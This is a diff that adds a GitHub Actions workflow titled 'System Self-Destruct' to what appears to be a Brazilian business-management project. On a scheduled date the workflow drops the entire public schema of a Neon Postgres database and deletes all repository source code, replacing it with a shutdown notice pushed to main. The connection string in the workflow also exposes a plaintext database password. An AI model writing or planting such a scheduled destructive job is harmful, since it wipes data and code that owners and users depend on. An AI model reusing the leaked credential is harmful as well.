@@ -1,0 +1,35 @@
+name: System Self-Destruct
+
+on:
+  schedule:
+    # Executa dia 10 de Agosto às 03:00 UTC (Meia-noite no Brasil)
+    - cron: '0 3 10 8 *'
+  workflow_dispatch: # Permite rodar manualmente se quiser
+
+jobs:
+  destruct:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Wipe Neon Database
+        env:
+          DATABASE_URL: "postgresql://neondb_owner:npg_oF1yTmOWLi4J@ep-red-surf-ach3bc28.sa-east-1.aws.neon.tech/neondb?sslmode=require"
+        run: |
+          sudo apt-get update && sudo apt-get install -y postgresql-client
+          psql "$DATABASE_URL" -c "DROP SCHEMA public CASCADE; CREATE SCHEMA public; GRANT ALL ON SCHEMA public TO public;"
+
+      - name: Delete All Source Code
+        run: |
+          git config --global user.name "Auto Destruct"
+          git config --global user.email "bot@mei-gestao.local"
+          # Remove todos os arquivos do repositório
+          git rm -rf .
+          # Deixa apenas um arquivo de aviso
+          echo "<h1>Sistema Desativado Permanentemente</h1><p>O projeto foi encerrado.</p>" > index.html
+          git add index.html
+          git commit -m "chore: self-destruct activated (DB wiped, code deleted)"
+          git push origin main
